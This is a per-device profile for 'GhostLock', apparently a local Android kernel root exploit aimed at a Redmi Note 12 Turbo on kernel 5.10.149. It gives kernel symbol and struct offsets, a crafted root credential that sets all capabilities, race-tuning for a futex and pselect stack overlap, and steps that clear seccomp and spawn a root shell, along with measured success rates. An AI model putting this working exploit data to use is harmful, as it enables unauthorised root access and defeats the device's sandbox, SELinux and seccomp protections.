# GhostLock kernel profile: 5.10.149-android12-9-00001-gda3d81545d1d-ab9545656
# Redmi Note 12 Turbo (marble / SM7475, WAIPIO) · MIUI V14.0.27.0.TMRCNXM · kernel 5.10.149.
# Symbols recovered from the device boot.img kallsyms table and cross-checked
# against the running kernel's /proc/kallsyms export (both agree item by item).
# task_struct / cred offsets come from the 5.10 GKI arm64 BTF layout, verified
# on device on the select_stack (pselect) route.
#
# `compact_waiter = 2` selects the 5.10 compact rt_mutex_waiter:
#   tree_entry@0x00 pi_tree_entry@0x18 task@0x30 lock@0x38 prio@0x40
#   deadline@0x48 (size 0x50) -- no wake_state, no ww_ctx.
# (1 = the 6.1 compact layout with wake_state@0x40|prio@0x44 and ww_ctx@0x50.)
#
# `waiter_shift = -2` is DERIVED from this image, not guessed. The extractor
# walks the pselect chain (__arm64_sys_pselect6 frame 0xa0 + core_sys_select
# 0x1c0, fd_set buffer at sp+0x50) against the futex chain (__arm64_sys_futex
# 0x90 + do_futex 0x70 + futex_wait_requeue_pi 0x1a0, waiter local at sp+0x90);
# both land at sp-0x210, so the waiter and fd_set word 0 coincide (delta 0
# qwords -> shift 0 - 2 = -2). An on-device A/B agrees: at 0 the craft never
# lands (3/3 `Write 1 failed`), at -2 it lands in most attempts. The -2 that
# my2's porting notes call a KernelPatch artifact is the same value this
# derivation produces for the stock image.
release = "5.10.149-android12-9-00001-gda3d81545d1d-ab9545656"
schema_version = 1
kernel_major = 5
recommend_shizuku = 0
kernel_phys_load = 2818572288
kernel_phys_offset = 2147483648
route {
  select_stack {
    waiter_shift = -2
    compact_waiter = 2
    # W3's leaf-directory write has landed on [target] on every marble run
    # recorded so far ("leaf=1 write lands on [target]" in 134 log/doc hits;
    # the [target+8] branch appears only as a .so format string, never at
    # runtime). Pinning it here drops the W3-0 probe route -- one fewer
    # write round, and one fewer chance for a miss to wedge the kernel.
    w3_leaf_to_target8 = 0
  }
}
fallback {
  to = "none"
}
# mm_struct is its own cache on this kernel: /proc/slabinfo reports
# `mm_struct 612 612 960 34 8` -- objsize 960, 34 objects over 8 pages (order 3),
# so the SLUB stride is 960 even though the struct size is 0x3e0.
kernelsnitch {
  mm_struct_sz = 960
  collisions = 4
}
task_struct {
  prio = 132
  normal_prio = 140
  sched_task_group = 784
  pi_lock = 2156
  pi_waiters = 2176
  pi_top_task = 2192
  pi_blocked_on = 2200
  pid = 1480
  tgid = 1484
  atomic_flags = 1424
  real_cred = 1912
  cred = 1920
  comm = 1936
  tasks = 1224
  seccomp = 2120
}
# W2 sprays a liveable root cred into the payload page. usage is large and odd so
# the count can never reach 0 (cred_free() on a page that is not a slab object
# corrupts the allocator), and user / user_ns / group_info point at the real
# root_user / init_user_ns / init_groups. Leaving those NULL survives only until
# the first getuid()/capable(), which dereferences cred->user_ns inside
# from_kuid_munged() and oopses -- and an oops here is a reboot.
#
# caps_offset = 40 is cap_inheritable, the first of the five consecutive 8-byte
# kernel_cap_t sets (inheritable/permitted/effective/bset/ambient, 0x28..0x50).
# The five words therefore end exactly at 0x50 and leave the keyring pointers
# alone. Writing from 48 instead puts the fifth word on cred->session_keyring,
# because the layout past the caps is session/process/thread/request_key_auth at
# 0x50/0x58/0x60/0x68 -- a live bogus 0xffffffffffffffff keyring pointer that
# key_put() would dereference. Measured on this image: cap_capable reads
# cred->user_ns at 0x88 and cap_effective at 0x38, and prepare_creds memcpys
# 0xa8 bytes, so the five cap sets sit at 0x28..0x50 and cred ends at 0xa8.
cred {
  copy_size = 168
  usage_offset = 0
  usage_value = 2147483647
  caps_offset = 40
  caps_count = 5
  caps_value = -1
  ref_count = 3
  ref0_offset = 128
  ref1_offset = 136
  ref2_offset = 144
  ref0_image = -272688876368
  ref1_image = -272688876216
  ref2_image = -272688870952
}
offset {
  init_task = 41467776
  init_cred = 41552176
  empty_zero_page = 43495424
  root_task_group = 43515968
  selinux_enforcing = 44235672
  selinux_blob_sizes = 36570608
  security_hook_heads = 36568928
  slide_nfulnl_logger = 41423952
  slide_loggers_0_1 = 41423752
  slide_boot_id = 44340029
}
# execution carries only the deltas from the shared presets. The resolver merges
# execution-tuning.conf and execution-select-stack.conf into this block (see
# docs/kernel_profiles/PROFILE_SCHEMA_ZH.md, section 5), so keys that would repeat
# a preset value verbatim (race, heap, handoff, w1_*, w2_*, enter_delay_us,
# timeout_us) are left out on purpose: copying them would pin this release to a
# preset that upstream may later improve. The three groups kept below are
# measured conclusions for this device, not copies of a preset.
execution {
  # Highest-frequency cluster on marble is 4-5 at 2.50 GHz.
  recommended_cpus {
    main = 4
    consumer = 5
  }
  selected_cpus {
    main = 4
    consumer = 5
  }
  stages {
    # W3 is enabled at one attempt per write, after measuring what disabling it
    # costs on device: with w3_attempts = 0 the rooted child forks its root
    # shell, execve hands control to mksh, and the shell dies of SIGSYS (waitpid
    # status 31) before its first command. The app's own seccomp filter is still
    # armed in that child, so nothing the root shell starts survives, and the
    # handoff script never runs a line. W3 is the only stage that clears
    # TIF_SECCOMP and seccomp.mode. The cost is real: the leaf direction probe
    # plus two writes is up to six pselects, and marble's 5.10 compact-waiter
    # route survives one only about four times in five, so a run that already
    # won W2 can still lose to W3 and reboot. w3_chain_rounds stays 1 because a
    # chain round re-parks the child; the retries live in w3_attempts instead.
    # Three attempts, because the 2026-10-26 batch measured the failure this
    # guards against: in 3 of 20 rounds both W3 writes reported success while the
    # probe still died of SIGSYS, so the erase had written nothing. A retry
    # re-crafts the page, which makes it an independent draw, and at 66-70 s
    # uptime no route was lost in 20 rounds, so the retry is nearly free.
    w3_chain_rounds = 1
    w3_attempts = 3
  }
  routes {
    select_stack {
      # Same value as the preset (1/1); kept explicit on purpose so the A/B
      # below cannot be undone by a future preset change. Landing rate, not a
      # guess: one fire per attempt only lands when the futex waiter has already
      # left the rt_mutex by itself. When it has not, that first fire is what
      # removes the waiter (remove_waiter -> wake), and the crafted words only
      # exist on the stack once the waiter's own pselect has copied them there.
      # So the write needs a second, gate-synchronised fire after that copy --
      # the path A gate waits for exactly that moment (syscall 72 Sleeping).
      # Raising this to 4 on 10-16 11:40 was meant as a rate lever; the only two
      # batches that ran with it are the two worst for W2 in the whole record
      # (multi-cold 2/6, leaf1 3/7 = 33%/43%) against 62-100% for every batch
      # that ran with 1, while W1 did not move (84%/76% -> 86%/88%) -- which
      # fits the Credential write alone carrying the red-parent hazard.
      consumer_max_calls = 1
      consumer_burst_calls = 1
    }
  }
}
